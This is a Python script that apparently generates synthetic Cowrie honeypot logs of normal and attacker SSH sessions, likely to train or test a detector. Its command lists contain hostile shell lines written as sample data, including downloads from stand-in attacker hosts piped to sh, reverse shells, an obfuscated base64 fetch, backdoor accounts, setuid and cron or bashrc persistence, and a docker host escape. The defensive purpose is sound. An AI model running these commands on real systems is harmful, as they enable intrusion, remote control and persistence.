import os
import json
import time
import random
from datetime import datetime, timezone

OUT   = os.getenv("OUT",   "/cowrie/var/log/cowrie/cowrie.json")
COUNT = int(os.getenv("COUNT", "300"))
MODE  = os.getenv("MODE",  "mixed")   # normal | suspicious | mixed

USERS_NORMAL = ["user", "ubuntu", "pi", "testuser", "alice"]
USERS_SUSP   = ["root", "admin", "administrator", "oracle", "postgres", "test", "guest"]
COMMON_PASS  = ["123456", "admin", "password", "root", "oracle123", "123qwe"]

NORMAL_COMMANDS = [
    "pwd", "ls", "ls -la", "whoami", "id", "echo $PATH",
    "uptime", "df -h", "free -m", "cat /etc/hostname", "history", "exit"
]

SUSPICIOUS_COMMANDS = [
    # recon
    "uname -a", "cat /etc/passwd", "cat /proc/cpuinfo",
    "netstat -tuln", "ps aux | grep sshd", "who", "last",
    "find / -name *.php", "ip a", "ifconfig",
    # post-exploitation
    "wget http://evil.com/m.sh",
    "curl -fsSL http://malware.org/payload | sh",
    "chmod +x /tmp/*.sh",
    "cd /tmp; wget http://attacker.ru/bot; chmod +x bot; ./bot",
    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "nc -e /bin/sh 10.0.0.1 4444",
    "python -c 'import socket,subprocess,os; ...'",
    # privesc — has_privesc
    "sudo su -",
    "sudo bash",
    "su root",
    "useradd -m -s /bin/bash backdoor; echo backdoor:toor | chpasswd",
    "usermod -aG sudo backdoor",
    "chmod u+s /bin/bash",
    "chown root /tmp/shell; chmod u+s /tmp/shell",
    "visudo",
    # persistence — has_persistence
    "echo 'ssh-rsa AAA...' >> ~/.ssh/authorized_keys",
    "crontab -e",
    "echo '* * * * * /tmp/bot' | crontab -",
    "systemctl enable malware.service",
    "echo '/tmp/bot &' >> ~/.bashrc",
    "echo '/tmp/bot &' >> ~/.profile",
    "cp /tmp/bot /etc/init.d/bot && chmod +x /etc/init.d/bot",
]

# ✅ Commandes qui échouent dans Cowrie (inconnues du honeypot)
# → génèrent cowrie.command.failed → détectées par ML uniquement
FAILED_COMMANDS = [
    # privesc échouées
    "useradd -m -s /bin/bash backdoor",
    "usermod -aG sudo hacker",
    "visudo -f /etc/sudoers",
    "chmod u+s /bin/bash",
    "chown root:root /tmp/exploit",
    "setuid /tmp/shell",
    # persistence échouées
    "systemctl enable malware.service",
    "systemctl start backdoor.service",
    "apt-get install -y netcat",
    "yum install -y wget",
    "docker run --privileged -v /:/host alpine chroot /host",
    "crontab -l | grep -v bot | crontab -",
    # commandes obfusquées
    "$(curl http://evil.com/shell.sh)",
    "eval $(echo 'd2dldCBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2g=' | base64 -d)",
    "python3 -c 'import os; os.system(\"id\")'",
    "perl -e 'system(\"wget http://evil.com/bot\")'",
]


def now_iso():
    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")


def write_event(ev):
    with open(OUT, "a", encoding="utf-8") as f:
        f.write(json.dumps(ev) + "\n")


def generate_session(session_id):
    src_ip  = f"172.30.0.{random.randint(1, 254)}"
    session = f"session_{session_id:04d}"
    user    = random.choice(USERS_NORMAL + USERS_SUSP)
    is_suspicious = (MODE == "suspicious") or (MODE == "mixed" and random.random() < 0.4)

    # Connexion
    write_event({"timestamp": now_iso(), "eventid": "cowrie.session.connect",
                 "src_ip": src_ip, "session": session,
                 "src_port": random.randint(1024, 65535)})

    # Tentatives de login
    attempts = random.randint(1, 8) if is_suspicious else 1
    for _ in range(attempts - 1):
        write_event({"timestamp": now_iso(), "eventid": "cowrie.login.failed",
                     "src_ip": src_ip, "session": session, "username": user,
                     "password": random.choice(COMMON_PASS + ["wrongpass123", "12345678"])})
        time.sleep(random.uniform(0.1, 1.2))

    success = not is_suspicious or random.random() < 0.7
    if success:
        write_event({"timestamp": now_iso(), "eventid": "cowrie.login.success",
                     "src_ip": src_ip, "session": session, "username": user,
                     "password": random.choice(COMMON_PASS) if is_suspicious else "userpass"})

        nb_cmds = random.randint(3, 18) if is_suspicious else random.randint(1, 6)
        cmds = SUSPICIOUS_COMMANDS if is_suspicious else NORMAL_COMMANDS

        for _ in range(nb_cmds):
            cmd = random.choice(cmds)
            write_event({"timestamp": now_iso(), "eventid": "cowrie.command.input",
                         "src_ip": src_ip, "session": session,
                         "username": user, "input": cmd})
            time.sleep(random.uniform(0.3, 3.5))

        # ✅ Ajouter des commandes échouées pour les sessions suspectes
        # Simule un attaquant qui tente des commandes non supportées par Cowrie
        if is_suspicious and random.random() < 0.5:
            nb_failed = random.randint(1, 4)
            for _ in range(nb_failed):
                cmd = random.choice(FAILED_COMMANDS)
                write_event({
                    "timestamp": now_iso(),
                    "eventid": "cowrie.command.failed",
                    "src_ip": src_ip,
                    "session": session,
                    "username": user,
                    "input": cmd,
                    "message": f"Command not found: {cmd}",
                })
                time.sleep(random.uniform(0.2, 2.0))

    # Fin de session
    write_event({"timestamp": now_iso(), "eventid": "cowrie.session.disconnect",
                 "src_ip": src_ip, "session": session})


def main():
    os.makedirs(os.path.dirname(OUT), exist_ok=True)
    for i in range(COUNT):
        generate_session(i)
        time.sleep(random.uniform(0.5, 4.0))


if __name__ == "__main__":
    main()